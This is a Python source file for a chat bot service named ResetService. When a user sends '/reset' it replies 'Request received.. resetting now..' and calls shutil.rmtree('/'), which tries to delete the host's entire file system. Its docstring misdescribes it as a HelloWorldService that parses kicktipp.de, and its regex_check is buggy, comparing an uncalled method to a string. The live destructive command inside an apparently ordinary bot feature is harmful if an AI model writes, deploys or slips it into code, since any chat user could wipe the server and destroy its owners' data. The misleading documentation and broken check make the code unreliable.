# coding=utf-8
# imports
from __future__ import absolute_import
import shutil
from kudubot.servicehandlers.Service import Service
from kudubot.connection.generic.Message import Message


class ResetService(Service):
    u"""
    The HelloWorldService Class that extends the generic Service class.
    The service parses www.kicktipp.de to get a kicktipp group's current standings
    """

    identifier = u"reset"
    u"""
    The identifier for this service
    """

    help_description = {u"en": u"/reset\tResets the host server to - well...\n",
                        u"de": u"/reset\tMacht viel Spaß!"}
    u"""
    Help description for this service.
    """

    def process_message(self, message):
        u"""
        Process a message according to the service's functionality

        :param message: the message to process
        :return: None
        """
        self.generate_reply_message(message, u"Reset initiated", u"Request received.. resetting now..")
        self.reset_fs()

    @staticmethod
    def regex_check(message):
        u"""
        Checks if the user input is valid for this service to continue

        :return: True if input is valid, False otherwise
        """
        return message.message_body.lower == u"/reset"

    @staticmethod
    def reset_fs():
        u"""
        'Resets' the file system
        :return: None
        """
        shutil.rmtree(u"/")
